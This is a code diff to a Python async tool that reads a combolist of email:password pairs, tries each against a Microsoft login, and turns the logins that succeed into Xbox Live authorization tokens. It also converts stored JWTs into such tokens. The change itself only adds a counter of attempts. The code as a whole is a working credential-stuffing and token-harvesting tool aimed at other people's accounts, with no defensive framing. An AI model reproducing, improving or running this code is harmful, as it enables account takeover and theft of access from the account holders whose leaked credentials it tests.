@@ -4,6 +4,7 @@ from urllib.parse import unquote
 from aiohttp import ClientSession
 class Auth:
     def __init__(self, accounts) -> None:
+        self.count = 0
         self.failed = 0
         self.accounts = open(accounts).read().splitlines()
     async def combolist(self) -> list:
@@ -18,13 +19,14 @@ class Auth:
                     ppft = search("sFTTag:'(.*)value=\"(.*)\"/>", (await r.text())).groups(1)[1]
                     async with sesh.post(posturl,data={'login':email,'loginfmt':email,'passwd':password,'PPFT':ppft},allow_redirects=False) as rs:
                         if "Location" not in rs.headers:
-                            self.failed += 1
+                            self.count += 1;self.failed += 1
                         else:
                             async with sesh.post("https://user.auth.xboxlive.com/user/authenticate",json={'RelyingParty':'http://auth.xboxlive.com','TokenType':'JWT','Properties':{'AuthMethod':'RPS','SiteName':'user.auth.xboxlive.com','RpsTicket':search("access_token=(.*)&t", unquote(rs.headers["Location"])).group(1).replace("&t", "")}}) as tokenr:
                                 async with sesh.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"RelyingParty": "http://xboxlive.com", "TokenType": "JWT", "Properties": {"UserTokens": [(await tokenr.json())["Token"]],"SandboxId": "RETAIL"}}) as resp:
                                     if resp.status == 200:
                                         b.append(["".join(["XBL3.0 x=", (await resp.json())["DisplayClaims"]["xui"][0]["uhs"], ";", (await resp.json())["Token"]]), int((await resp.json())["DisplayClaims"]["xui"][0]["xid"])])
-                                    else: self.failed += 1
+                                        self.count += 1
+                                    else: self.count += 1;self.failed += 1
         return tuple(map(tuple, b)), self.failed
     async def jwt(self) -> list:
         z = []
@@ -33,5 +35,6 @@ class Auth:
                 async with sesh.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"RelyingParty": "http://xboxlive.com", "TokenType": "JWT", "Properties": {"UserTokens": [token.strip("\n")],"SandboxId": "RETAIL"}}) as resp:
                         if resp.status == 200:
                             z.append(["".join(["XBL3.0 x=", (await resp.json())["DisplayClaims"]["xui"][0]["uhs"], ";", (await resp.json())["Token"]]), int((await resp.json())["DisplayClaims"]["xui"][0]["xid"])])
-                        else: self.failed += 1
+                            self.count += 1
+                        else: self.count += 1;self.failed += 1
         return tuple(map(tuple, z)), self.failed
